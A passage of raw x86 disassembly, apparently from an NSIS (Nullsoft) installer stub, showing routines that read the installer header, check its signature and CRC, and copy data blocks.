  40325c:	e8 a6 ff ff ff       	call   0x403207
  403261:	c2 04 00             	ret    $0x4
  403264:	6a 00                	push   $0x0
  403266:	ff 74 24 0c          	push   0xc(%esp)
  40326a:	ff 74 24 0c          	push   0xc(%esp)
  40326e:	ff 35 10 b0 40 00    	push   0x40b010
  403274:	e8 8e ff ff ff       	call   0x403207
  403279:	c2 08 00             	ret    $0x8
  40327c:	ff 74 24 08          	push   0x8(%esp)
  403280:	ff 74 24 08          	push   0x8(%esp)
  403284:	ff 35 14 b0 40 00    	push   0x40b014
  40328a:	e8 55 2f 00 00       	call   0x4061e4
  40328f:	c2 08 00             	ret    $0x8
  403292:	6a 00                	push   $0x0
  403294:	ff 74 24 0c          	push   0xc(%esp)
  403298:	ff 74 24 0c          	push   0xc(%esp)
  40329c:	ff 35 14 b0 40 00    	push   0x40b014
  4032a2:	e8 60 ff ff ff       	call   0x403207
  4032a7:	c2 08 00             	ret    $0x8
  4032aa:	55                   	push   %ebp
  4032ab:	8b ec                	mov    %esp,%ebp
  4032ad:	83 3d ec a5 42 00 00 	cmpl   $0x0,0x42a5ec
  4032b4:	74 17                	je     0x4032cd
  4032b6:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4032ba:	75 11                	jne    0x4032cd
  4032bc:	ff 75 0c             	push   0xc(%ebp)
  4032bf:	ff 75 08             	push   0x8(%ebp)
  4032c2:	e8 b5 ff ff ff       	call   0x40327c
  4032c7:	85 c0                	test   %eax,%eax
  4032c9:	75 0f                	jne    0x4032da
  4032cb:	5d                   	pop    %ebp
  4032cc:	c3                   	ret
  4032cd:	ff 75 0c             	push   0xc(%ebp)
  4032d0:	ff 75 08             	push   0x8(%ebp)
  4032d3:	e8 19 ff ff ff       	call   0x4031f1
  4032d8:	eb ed                	jmp    0x4032c7
  4032da:	33 c0                	xor    %eax,%eax
  4032dc:	40                   	inc    %eax
  4032dd:	5d                   	pop    %ebp
  4032de:	c3                   	ret
  4032df:	55                   	push   %ebp
  4032e0:	8b ec                	mov    %esp,%ebp
  4032e2:	33 c0                	xor    %eax,%eax
  4032e4:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4032e7:	7c 35                	jl     0x40331e
  4032e9:	7f 05                	jg     0x4032f0
  4032eb:	39 45 08             	cmp    %eax,0x8(%ebp)
  4032ee:	72 2e                	jb     0x40331e
  4032f0:	39 05 ec a5 42 00    	cmp    %eax,0x42a5ec
  4032f6:	74 12                	je     0x40330a
  4032f8:	39 45 10             	cmp    %eax,0x10(%ebp)
  4032fb:	75 0d                	jne    0x40330a
  4032fd:	ff 75 0c             	push   0xc(%ebp)
  403300:	ff 75 08             	push   0x8(%ebp)
  403303:	e8 8a ff ff ff       	call   0x403292
  403308:	5d                   	pop    %ebp
  403309:	c3                   	ret
  40330a:	a1 d8 a5 42 00       	mov    0x42a5d8,%eax
  40330f:	33 c9                	xor    %ecx,%ecx
  403311:	03 45 08             	add    0x8(%ebp),%eax
  403314:	13 4d 0c             	adc    0xc(%ebp),%ecx
  403317:	51                   	push   %ecx
  403318:	50                   	push   %eax
  403319:	e8 46 ff ff ff       	call   0x403264
  40331e:	5d                   	pop    %ebp
  40331f:	c3                   	ret
  403320:	55                   	push   %ebp
  403321:	8b ec                	mov    %esp,%ebp
  403323:	81 ec ac 00 00 00    	sub    $0xac,%esp
  403329:	53                   	push   %ebx
  40332a:	8b 5d 18             	mov    0x18(%ebp),%ebx
  40332d:	33 c0                	xor    %eax,%eax
  40332f:	3b d8                	cmp    %eax,%ebx
  403331:	74 08                	je     0x40333b
  403333:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  403336:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  403339:	eb 07                	jmp    0x403342
  40333b:	c7 45 e8 00 80 00 00 	movl   $0x8000,-0x18(%ebp)
  403342:	3b d8                	cmp    %eax,%ebx
  403344:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403347:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40334a:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40334d:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  403350:	75 07                	jne    0x403359
  403352:	c7 45 e4 70 19 41 00 	movl   $0x411970,-0x1c(%ebp)
  403359:	ff 75 08             	push   0x8(%ebp)
  40335c:	ff 75 10             	push   0x10(%ebp)
  40335f:	ff 75 0c             	push   0xc(%ebp)
  403362:	e8 78 ff ff ff       	call   0x4032df
  403367:	ff 75 08             	push   0x8(%ebp)
  40336a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40336d:	6a 08                	push   $0x8
  40336f:	50                   	push   %eax
  403370:	e8 35 ff ff ff       	call   0x4032aa
  403375:	83 c4 18             	add    $0x18,%esp
  403378:	85 c0                	test   %eax,%eax
  40337a:	75 0b                	jne    0x403387
  40337c:	6a fd                	push   $0xfffffffd
  40337e:	58                   	pop    %eax
  40337f:	83 ca ff             	or     $0xffffffff,%edx
  403382:	e9 df 02 00 00       	jmp    0x403666
  403387:	56                   	push   %esi
  403388:	8b 75 e0             	mov    -0x20(%ebp),%esi
  40338b:	8b ce                	mov    %esi,%ecx
  40338d:	81 e1 00 00 00 80    	and    $0x80000000,%ecx
  403393:	33 c0                	xor    %eax,%eax
  403395:	0b c1                	or     %ecx,%eax
  403397:	57                   	push   %edi
  403398:	8b 7d dc             	mov    -0x24(%ebp),%edi
  40339b:	89 75 f4             	mov    %esi,-0xc(%ebp)
  40339e:	0f 84 b8 01 00 00    	je     0x40355c
  4033a4:	ff 15 f0 90 40 00    	call   *0x4090f0
  4033aa:	89 45 1c             	mov    %eax,0x1c(%ebp)
  4033ad:	e8 83 33 00 00       	call   0x406735
  4033b2:	50                   	push   %eax
  4033b3:	68 78 19 42 00       	push   $0x421978
  4033b8:	e8 64 42 00 00       	call   0x407621
  4033bd:	81 65 f4 ff ff ff 7f 	andl   $0x7fffffff,-0xc(%ebp)
  4033c4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4033c7:	59                   	pop    %ecx
  4033c8:	59                   	pop    %ecx
  4033c9:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  4033cc:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4033cf:	0f 8c 65 02 00 00    	jl     0x40363a
  4033d5:	7f 08                	jg     0x4033df
  4033d7:	85 ff                	test   %edi,%edi
  4033d9:	0f 86 5b 02 00 00    	jbe    0x40363a
  4033df:	bb 70 d9 40 00       	mov    $0x40d970,%ebx
  4033e4:	eb 03                	jmp    0x4033e9
  4033e6:	8b 7d f0             	mov    -0x10(%ebp),%edi
  4033e9:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  4033ed:	7f 0e                	jg     0x4033fd
  4033ef:	7c 08                	jl     0x4033f9
  4033f1:	81 ff 00 40 00 00    	cmp    $0x4000,%edi
  4033f7:	73 04                	jae    0x4033fd
  4033f9:	8b f7                	mov    %edi,%esi
  4033fb:	eb 05                	jmp    0x403402
  4033fd:	be 00 40 00 00       	mov    $0x4000,%esi
  403402:	ff 75 08             	push   0x8(%ebp)
  403405:	56                   	push   %esi
  403406:	53                   	push   %ebx
  403407:	e8 9e fe ff ff       	call   0x4032aa
  40340c:	83 c4 0c             	add    $0xc,%esp
  40340f:	85 c0                	test   %eax,%eax
  403411:	0f 84 fd 01 00 00    	je     0x403614
  403417:	83 3d d8 19 42 00 00 	cmpl   $0x0,0x4219d8
  40341e:	74 0d                	je     0x40342d
  403420:	56                   	push   %esi
  403421:	53                   	push   %ebx
  403422:	ff 75 ec             	push   -0x14(%ebp)
  403425:	e8 98 3a 00 00       	call   0x406ec2
  40342a:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40342d:	8b c6                	mov    %esi,%eax
  40342f:	99                   	cltd
  403430:	2b f8                	sub    %eax,%edi
  403432:	19 55 f4             	sbb    %edx,-0xc(%ebp)
  403435:	89 1d 78 19 42 00    	mov    %ebx,0x421978
  40343b:	89 35 7c 19 42 00    	mov    %esi,0x42197c
  403441:	89 7d f0             	mov    %edi,-0x10(%ebp)
  403444:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403447:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  40344a:	68 78 19 42 00       	push   $0x421978
  40344f:	89 3d 80 19 42 00    	mov    %edi,0x421980
  403455:	a3 84 19 42 00       	mov    %eax,0x421984
  40345a:	e8 2e 3f 00 00       	call   0x40738d
  40345f:	85 c0                	test   %eax,%eax
  403461:	59                   	pop    %ecx
  403462:	89 45 10             	mov    %eax,0x10(%ebp)
  403465:	0f 8c ea 00 00 00    	jl     0x403555
  40346b:	8b 35 80 19 42 00    	mov    0x421980,%esi
  403471:	2b f7                	sub    %edi,%esi
  403473:	ff 15 f0 90 40 00    	call   *0x4090f0
  403479:	f6 05 74 a6 42 00 01 	testb  $0x1,0x42a674
  403480:	8b f8                	mov    %eax,%edi
  403482:	74 60                	je     0x4034e4
  403484:	2b 45 1c             	sub    0x1c(%ebp),%eax
  403487:	3d c8 00 00 00       	cmp    $0xc8,%eax
  40348c:	77 08                	ja     0x403496
  40348e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403491:	0b 45 f4             	or     -0xc(%ebp),%eax
  403494:	75 4e                	jne    0x4034e4
  403496:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403499:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40349c:	a3 d0 19 42 00       	mov    %eax,0x4219d0
  4034a1:	2b 45 f0             	sub    -0x10(%ebp),%eax
  4034a4:	89 0d d4 19 42 00    	mov    %ecx,0x4219d4
  4034aa:	1b 4d f4             	sbb    -0xc(%ebp),%ecx
  4034ad:	a3 c8 19 42 00       	mov    %eax,0x4219c8
  4034b2:	89 0d cc 19 42 00    	mov    %ecx,0x4219cc
  4034b8:	e8 16 fc ff ff       	call   0x4030d3
  4034bd:	50                   	push   %eax
  4034be:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
  4034c4:	68 18 93 40 00       	push   $0x409318
  4034c9:	50                   	push   %eax
  4034ca:	ff 15 4c 92 40 00    	call   *0x40924c
  4034d0:	83 c4 0c             	add    $0xc,%esp
  4034d3:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
  4034d9:	50                   	push   %eax
  4034da:	6a 00                	push   $0x0
  4034dc:	e8 5d 1d 00 00       	call   0x40523e
  4034e1:	89 7d 1c             	mov    %edi,0x1c(%ebp)
  4034e4:	33 ff                	xor    %edi,%edi
  4034e6:	3b f7                	cmp    %edi,%esi
  4034e8:	74 4d                	je     0x403537
  4034ea:	39 7d 18             	cmp    %edi,0x18(%ebp)
  4034ed:	75 1f                	jne    0x40350e
  4034ef:	56                   	push   %esi
  4034f0:	ff 75 e4             	push   -0x1c(%ebp)
  4034f3:	ff 75 14             	push   0x14(%ebp)
  4034f6:	e8 18 2d 00 00       	call   0x406213
  4034fb:	85 c0                	test   %eax,%eax
  4034fd:	0f 84 e7 00 00 00    	je     0x4035ea
  403503:	8b c6                	mov    %esi,%eax
  403505:	99                   	cltd
  403506:	01 45 f8             	add    %eax,-0x8(%ebp)
  403509:	11 55 fc             	adc    %edx,-0x4(%ebp)
  40350c:	eb 14                	jmp    0x403522
  40350e:	8b c6                	mov    %esi,%eax
  403510:	99                   	cltd
  403511:	01 45 f8             	add    %eax,-0x8(%ebp)
  403514:	a1 80 19 42 00       	mov    0x421980,%eax
  403519:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40351c:	11 55 fc             	adc    %edx,-0x4(%ebp)
  40351f:	29 75 e8             	sub    %esi,-0x18(%ebp)
  403522:	83 7d 10 01          	cmpl   $0x1,0x10(%ebp)
  403526:	0f 85 18 ff ff ff    	jne    0x403444
  40352c:	39 3d d8 19 42 00    	cmp    %edi,0x4219d8
  403532:	e9 0a 01 00 00       	jmp    0x403641
  403537:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  40353a:	0f 8f a6 fe ff ff    	jg     0x4033e6
  403540:	0f 8c f4 00 00 00    	jl     0x40363a
  403546:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  40354a:	0f 87 96 fe ff ff    	ja     0x4033e6
  403550:	e9 e5 00 00 00       	jmp    0x40363a
  403555:	6a fc                	push   $0xfffffffc
  403557:	e9 ba 00 00 00       	jmp    0x403616
  40355c:	85 db                	test   %ebx,%ebx
  40355e:	0f 85 8a 00 00 00    	jne    0x4035ee
  403564:	85 f6                	test   %esi,%esi
  403566:	0f 8c ce 00 00 00    	jl     0x40363a
  40356c:	7f 08                	jg     0x403576
  40356e:	85 ff                	test   %edi,%edi
  403570:	0f 86 c4 00 00 00    	jbe    0x40363a
  403576:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403579:	99                   	cltd
  40357a:	89 45 0c             	mov    %eax,0xc(%ebp)
  40357d:	89 55 10             	mov    %edx,0x10(%ebp)
  403580:	bb 70 d9 40 00       	mov    $0x40d970,%ebx
  403585:	8b 45 10             	mov    0x10(%ebp),%eax
  403588:	39 45 f4             	cmp    %eax,-0xc(%ebp)
  40358b:	7f 0b                	jg     0x403598
  40358d:	7c 05                	jl     0x403594
  40358f:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  403592:	73 04                	jae    0x403598
  403594:	8b f7                	mov    %edi,%esi
  403596:	eb 03                	jmp    0x40359b
  403598:	8b 75 e8             	mov    -0x18(%ebp),%esi
  40359b:	ff 75 08             	push   0x8(%ebp)
  40359e:	56                   	push   %esi
  40359f:	53                   	push   %ebx
  4035a0:	e8 05 fd ff ff       	call   0x4032aa
  4035a5:	83 c4 0c             	add    $0xc,%esp
  4035a8:	85 c0                	test   %eax,%eax
  4035aa:	74 68                	je     0x403614
  4035ac:	83 3d d8 19 42 00 00 	cmpl   $0x0,0x4219d8
  4035b3:	74 0d                	je     0x4035c2
  4035b5:	56                   	push   %esi
  4035b6:	53                   	push   %ebx
  4035b7:	ff 75 ec             	push   -0x14(%ebp)
  4035ba:	e8 03 39 00 00       	call   0x406ec2
  4035bf:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4035c2:	56                   	push   %esi
  4035c3:	53                   	push   %ebx
  4035c4:	ff 75 14             	push   0x14(%ebp)
  4035c7:	e8 47 2c 00 00       	call   0x406213
  4035cc:	85 c0                	test   %eax,%eax
  4035ce:	74 1a                	je     0x4035ea
  4035d0:	33 c0                	xor    %eax,%eax
  4035d2:	01 75 f8             	add    %esi,-0x8(%ebp)
  4035d5:	11 45 fc             	adc    %eax,-0x4(%ebp)
  4035d8:	2b fe                	sub    %esi,%edi
  4035da:	19 45 f4             	sbb    %eax,-0xc(%ebp)
  4035dd:	39 45 f4             	cmp    %eax,-0xc(%ebp)
  4035e0:	7f a3                	jg     0x403585
  4035e2:	7c 56                	jl     0x40363a
  4035e4:	85 ff                	test   %edi,%edi
  4035e6:	77 9d                	ja     0x403585
  4035e8:	eb 50                	jmp    0x40363a
  4035ea:	6a fe                	push   $0xfffffffe
  4035ec:	eb 28                	jmp    0x403616
  4035ee:	8b 45 1c             	mov    0x1c(%ebp),%eax
  4035f1:	99                   	cltd
  4035f2:	3b f2                	cmp    %edx,%esi
  4035f4:	7f 0a                	jg     0x403600
  4035f6:	7c 04                	jl     0x4035fc
  4035f8:	3b f8                	cmp    %eax,%edi
  4035fa:	73 04                	jae    0x403600
  4035fc:	8b f7                	mov    %edi,%esi
  4035fe:	eb 03                	jmp    0x403603
  403600:	8b 75 1c             	mov    0x1c(%ebp),%esi
  403603:	ff 75 08             	push   0x8(%ebp)
  403606:	56                   	push   %esi
  403607:	53                   	push   %ebx
  403608:	e8 9d fc ff ff       	call   0x4032aa
  40360d:	83 c4 0c             	add    $0xc,%esp
  403610:	85 c0                	test   %eax,%eax
  403612:	75 08                	jne    0x40361c
  403614:	6a fd                	push   $0xfffffffd
  403616:	58                   	pop    %eax
  403617:	83 ca ff             	or     $0xffffffff,%edx
  40361a:	eb 48                	jmp    0x403664
  40361c:	83 3d d8 19 42 00 00 	cmpl   $0x0,0x4219d8
  403623:	74 0c                	je     0x403631
  403625:	56                   	push   %esi
  403626:	53                   	push   %ebx
  403627:	6a 00                	push   $0x0
  403629:	e8 94 38 00 00       	call   0x406ec2
  40362e:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403631:	8b c6                	mov    %esi,%eax
  403633:	99                   	cltd
  403634:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403637:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40363a:	83 3d d8 19 42 00 00 	cmpl   $0x0,0x4219d8
  403641:	74 1b                	je     0x40365e
  403643:	6a 08                	push   $0x8
  403645:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403648:	50                   	push   %eax
  403649:	ff 75 ec             	push   -0x14(%ebp)
  40364c:	e8 71 38 00 00       	call   0x406ec2
  403651:	3b 45 20             	cmp    0x20(%ebp),%eax
  403654:	74 08                	je     0x40365e
  403656:	6a fd                	push   $0xfffffffd
  403658:	83 ca ff             	or     $0xffffffff,%edx
  40365b:	58                   	pop    %eax
  40365c:	eb 06                	jmp    0x403664
  40365e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403661:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403664:	5f                   	pop    %edi
  403665:	5e                   	pop    %esi
  403666:	5b                   	pop    %ebx
  403667:	c9                   	leave
  403668:	c2 1c 00             	ret    $0x1c
  40366b:	55                   	push   %ebp
  40366c:	8b ec                	mov    %esp,%ebp
  40366e:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  403674:	53                   	push   %ebx
  403675:	33 db                	xor    %ebx,%ebx
  403677:	57                   	push   %edi
  403678:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40367b:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40367e:	ff 15 f0 90 40 00    	call   *0x4090f0
  403684:	68 00 04 00 00       	push   $0x400
  403689:	bf 00 88 43 00       	mov    $0x438800,%edi
  40368e:	57                   	push   %edi
  40368f:	05 e8 03 00 00       	add    $0x3e8,%eax
  403694:	53                   	push   %ebx
  403695:	a3 e4 a5 42 00       	mov    %eax,0x42a5e4
  40369a:	ff 15 e4 90 40 00    	call   *0x4090e4
  4036a0:	6a 03                	push   $0x3
  4036a2:	68 00 00 00 80       	push   $0x80000000
  4036a7:	57                   	push   %edi
  4036a8:	e8 b4 2a 00 00       	call   0x406161
  4036ad:	83 f8 ff             	cmp    $0xffffffff,%eax
  4036b0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4036b3:	a3 10 b0 40 00       	mov    %eax,0x40b010
  4036b8:	75 0a                	jne    0x4036c4
  4036ba:	b8 c8 94 40 00       	mov    $0x4094c8,%eax
  4036bf:	e9 01 03 00 00       	jmp    0x4039c5
  4036c4:	56                   	push   %esi
  4036c5:	57                   	push   %edi
  4036c6:	be 00 68 43 00       	mov    $0x436800,%esi
  4036cb:	56                   	push   %esi
  4036cc:	e8 f6 2d 00 00       	call   0x4064c7
  4036d1:	56                   	push   %esi
  4036d2:	e8 10 31 00 00       	call   0x4067e7
  4036d7:	50                   	push   %eax
  4036d8:	68 00 90 43 00       	push   $0x439000
  4036dd:	e8 e5 2d 00 00       	call   0x4064c7
  4036e2:	53                   	push   %ebx
  4036e3:	ff 75 f0             	push   -0x10(%ebp)
  4036e6:	ff 15 e8 90 40 00    	call   *0x4090e8
  4036ec:	8b f0                	mov    %eax,%esi
  4036ee:	3b f3                	cmp    %ebx,%esi
  4036f0:	89 35 d0 19 42 00    	mov    %esi,0x4219d0
  4036f6:	89 1d d4 19 42 00    	mov    %ebx,0x4219d4
  4036fc:	0f 86 35 01 00 00    	jbe    0x403837
  403702:	a1 f4 a5 42 00       	mov    0x42a5f4,%eax
  403707:	f7 d8                	neg    %eax
  403709:	1b c0                	sbb    %eax,%eax
  40370b:	25 00 7e 00 00       	and    $0x7e00,%eax
  403710:	05 00 02 00 00       	add    $0x200,%eax
  403715:	3b f0                	cmp    %eax,%esi
  403717:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40371a:	72 03                	jb     0x40371f
  40371c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40371f:	ff 75 fc             	push   -0x4(%ebp)
  403722:	68 78 99 41 00       	push   $0x419978
  403727:	e8 c5 fa ff ff       	call   0x4031f1
  40372c:	85 c0                	test   %eax,%eax
  40372e:	0f 84 48 02 00 00    	je     0x40397c
  403734:	39 1d f4 a5 42 00    	cmp    %ebx,0x42a5f4
  40373a:	0f 85 ae 00 00 00    	jne    0x4037ee
  403740:	6a 24                	push   $0x24
  403742:	68 78 99 41 00       	push   $0x419978
  403747:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40374a:	50                   	push   %eax
  40374b:	e8 c7 29 00 00       	call   0x406117
  403750:	f7 45 cc 00 fe ff ff 	testl  $0xfffffe00,-0x34(%ebp)
  403757:	0f 85 9e 00 00 00    	jne    0x4037fb
  40375d:	81 7d d0 ef be ad de 	cmpl   $0xdeadbeef,-0x30(%ebp)
  403764:	0f 85 91 00 00 00    	jne    0x4037fb
  40376a:	81 7d dc 49 6e 73 74 	cmpl   $0x74736e49,-0x24(%ebp)
  403771:	0f 85 84 00 00 00    	jne    0x4037fb
  403777:	81 7d d8 73 6f 66 74 	cmpl   $0x74666f73,-0x28(%ebp)
  40377e:	75 7b                	jne    0x4037fb
  403780:	81 7d d4 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x2c(%ebp)
  403787:	75 72                	jne    0x4037fb
  403789:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40378c:	09 4d 08             	or     %ecx,0x8(%ebp)
  40378f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403792:	a1 c8 19 42 00       	mov    0x4219c8,%eax
  403797:	83 e1 02             	and    $0x2,%ecx
  40379a:	09 0d 60 a6 42 00    	or     %ecx,0x42a660
  4037a0:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4037a3:	3b ce                	cmp    %esi,%ecx
  4037a5:	a3 f4 a5 42 00       	mov    %eax,0x42a5f4
  4037aa:	0f 87 c5 01 00 00    	ja     0x403975
  4037b0:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  4037b4:	75 06                	jne    0x4037bc
  4037b6:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  4037ba:	75 7b                	jne    0x403837
  4037bc:	ff 05 d8 19 42 00    	incl   0x4219d8
  4037c2:	83 c1 d8             	add    $0xffffffd8,%ecx
  4037c5:	03 c1                	add    %ecx,%eax
  4037c7:	8b 0d cc 19 42 00    	mov    0x4219cc,%ecx
  4037cd:	13 cb                	adc    %ebx,%ecx
  4037cf:	6a 24                	push   $0x24
  4037d1:	a3 c8 19 42 00       	mov    %eax,0x4219c8
  4037d6:	83 c0 20             	add    $0x20,%eax
  4037d9:	5e                   	pop    %esi
  4037da:	89 0d cc 19 42 00    	mov    %ecx,0x4219cc
  4037e0:	13 cb                	adc    %ebx,%ecx
  4037e2:	51                   	push   %ecx
  4037e3:	50                   	push   %eax
  4037e4:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4037e7:	e8 78 fa ff ff       	call   0x403264
  4037ec:	eb 0d                	jmp    0x4037fb
  4037ee:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  4037f2:	75 07                	jne    0x4037fb
  4037f4:	53                   	push   %ebx
  4037f5:	e8 93 f9 ff ff       	call   0x40318d
  4037fa:	59                   	pop    %ecx
  4037fb:	3b 1d d4 19 42 00    	cmp    0x4219d4,%ebx
  403801:	77 1d                	ja     0x403820
  403803:	72 08                	jb     0x40380d
  403805:	3b 35 d0 19 42 00    	cmp    0x4219d0,%esi
  40380b:	73 13                	jae    0x403820
  40380d:	ff 75 fc             	push   -0x4(%ebp)
  403810:	68 78 99 41 00       	push   $0x419978
  403815:	ff 75 f4             	push   -0xc(%ebp)
  403818:	e8 a5 36 00 00       	call   0x406ec2
  40381d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403820:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403823:	01 05 c8 19 42 00    	add    %eax,0x4219c8
  403829:	11 1d cc 19 42 00    	adc    %ebx,0x4219cc
  40382f:	2b f0                	sub    %eax,%esi
  403831:	0f 85 cb fe ff ff    	jne    0x403702
  403837:	f6 45 cc 01          	testb  $0x1,-0x34(%ebp)
  40383b:	74 06                	je     0x403843
  40383d:	ff 05 e8 a5 42 00    	incl   0x42a5e8
  403843:	f6 45 cc 80          	testb  $0x80,-0x34(%ebp)
  403847:	74 06                	je     0x40384f
  403849:	ff 05 ec a5 42 00    	incl   0x42a5ec
  40384f:	66 f7 45 cc 00 01    	testw  $0x100,-0x34(%ebp)
  403855:	74 06                	je     0x40385d
  403857:	ff 05 e0 a5 42 00    	incl   0x42a5e0
  40385d:	39 1d ec a5 42 00    	cmp    %ebx,0x42a5ec
  403863:	74 6d                	je     0x4038d2
  403865:	39 1d e8 a5 42 00    	cmp    %ebx,0x42a5e8
  40386b:	75 65                	jne    0x4038d2
  40386d:	57                   	push   %edi
  40386e:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  403874:	50                   	push   %eax
  403875:	e8 4d 2c 00 00       	call   0x4064c7
  40387a:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  403880:	50                   	push   %eax
  403881:	e8 8d 2f 00 00       	call   0x406813
  403886:	50                   	push   %eax
  403887:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  40388d:	50                   	push   %eax
  40388e:	e8 34 2c 00 00       	call   0x4064c7
  403893:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  403899:	50                   	push   %eax
  40389a:	68 cc 92 40 00       	push   $0x4092cc
  40389f:	50                   	push   %eax
  4038a0:	ff 15 4c 92 40 00    	call   *0x40924c
  4038a6:	83 c4 0c             	add    $0xc,%esp
  4038a9:	6a 03                	push   $0x3
  4038ab:	68 00 00 00 80       	push   $0x80000000
  4038b0:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  4038b6:	50                   	push   %eax
  4038b7:	e8 a5 28 00 00       	call   0x406161
  4038bc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4038bf:	a3 14 b0 40 00       	mov    %eax,0x40b014
  4038c4:	75 0c                	jne    0x4038d2
  4038c6:	39 1d e0 a5 42 00    	cmp    %ebx,0x42a5e0
  4038cc:	0f 84 a3 00 00 00    	je     0x403975
  4038d2:	6a 01                	push   $0x1
  4038d4:	e8 b4 f8 ff ff       	call   0x40318d
  4038d9:	39 1d f4 a5 42 00    	cmp    %ebx,0x42a5f4
  4038df:	59                   	pop    %ecx
  4038e0:	0f 84 8f 00 00 00    	je     0x403975
  4038e6:	39 1d d8 19 42 00    	cmp    %ebx,0x4219d8
  4038ec:	74 49                	je     0x403937
  4038ee:	a1 c8 19 42 00       	mov    0x4219c8,%eax
  4038f3:	8b 0d cc 19 42 00    	mov    0x4219cc,%ecx
  4038f9:	6a 04                	push   $0x4
  4038fb:	5e                   	pop    %esi
  4038fc:	2b c6                	sub    %esi,%eax
  4038fe:	1b cb                	sbb    %ebx,%ecx
  403900:	51                   	push   %ecx
  403901:	50                   	push   %eax
  403902:	e8 5d f9 ff ff       	call   0x403264
  403907:	56                   	push   %esi
  403908:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40390b:	50                   	push   %eax
  40390c:	e8 e0 f8 ff ff       	call   0x4031f1
  403911:	85 c0                	test   %eax,%eax
  403913:	74 60                	je     0x403975
  403915:	56                   	push   %esi
  403916:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403919:	50                   	push   %eax
  40391a:	ff 75 f4             	push   -0xc(%ebp)
  40391d:	e8 a0 35 00 00       	call   0x406ec2
  403922:	8b f8                	mov    %eax,%edi
  403924:	56                   	push   %esi
  403925:	8d 45 08             	lea    0x8(%ebp),%eax
  403928:	50                   	push   %eax
  403929:	e8 c3 f8 ff ff       	call   0x4031f1
  40392e:	85 c0                	test   %eax,%eax
  403930:	74 43                	je     0x403975
  403932:	3b 7d 08             	cmp    0x8(%ebp),%edi
  403935:	75 3e                	jne    0x403975
  403937:	ff 75 e0             	push   -0x20(%ebp)
  40393a:	6a 40                	push   $0x40
  40393c:	ff 15 2c 91 40 00    	call   *0x40912c
  403942:	8b f0                	mov    %eax,%esi
  403944:	a1 f4 a5 42 00       	mov    0x42a5f4,%eax
  403949:	83 c0 24             	add    $0x24,%eax
  40394c:	50                   	push   %eax
  40394d:	e8 fb f8 ff ff       	call   0x40324d
  403952:	ff 75 f8             	push   -0x8(%ebp)
  403955:	ff 75 e0             	push   -0x20(%ebp)
  403958:	56                   	push   %esi
  403959:	53                   	push   %ebx
  40395a:	6a ff                	push   $0xffffffff
  40395c:	6a ff                	push   $0xffffffff
  40395e:	6a 01                	push   $0x1
  403960:	e8 bb f9 ff ff       	call   0x403320
  403965:	8b c8                	mov    %eax,%ecx
  403967:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40396a:	8b fa                	mov    %edx,%edi
  40396c:	99                   	cltd
  40396d:	3b c8                	cmp    %eax,%ecx
  40396f:	75 04                	jne    0x403975
  403971:	3b fa                	cmp    %edx,%edi
  403973:	74 11                	je     0x403986
  403975:	b8 30 93 40 00       	mov    $0x409330,%eax
  40397a:	eb 48                	jmp    0x4039c4
  40397c:	6a 01                	push   $0x1
  40397e:	e8 0a f8 ff ff       	call   0x40318d
  403983:	59                   	pop    %ecx
  403984:	eb ef                	jmp    0x403975
  403986:	89 35 8c a5 42 00    	mov    %esi,0x42a58c
  40398c:	8b 06                	mov    (%esi),%eax
  40398e:	6a 08                	push   $0x8
  403990:	a3 f0 a5 42 00       	mov    %eax,0x42a5f0
  403995:	59                   	pop    %ecx
